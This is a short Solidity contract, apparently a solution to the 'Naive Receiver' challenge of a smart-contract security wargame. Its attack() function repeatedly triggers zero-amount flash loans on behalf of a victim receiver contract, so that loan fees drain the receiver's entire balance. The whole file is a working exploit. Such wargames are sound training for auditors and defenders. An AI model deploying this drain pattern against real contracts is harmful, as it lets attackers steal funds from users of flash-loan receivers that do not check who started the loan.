// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

interface INaiveReceiverLenderPool {

  function flashLoan(address borrower, uint256 borrowAmount) external;

}

contract AttackNaiveReceiver {

  INaiveReceiverLenderPool internal _pool;
  address internal _receiver;

  constructor(address pool, address receiver) {
    _pool = INaiveReceiverLenderPool(pool);
    _receiver = receiver;
  }

  function attack() public {
    while (_receiver.balance > 0) {
      _pool.flashLoan(_receiver, 0);
    }
  }

}
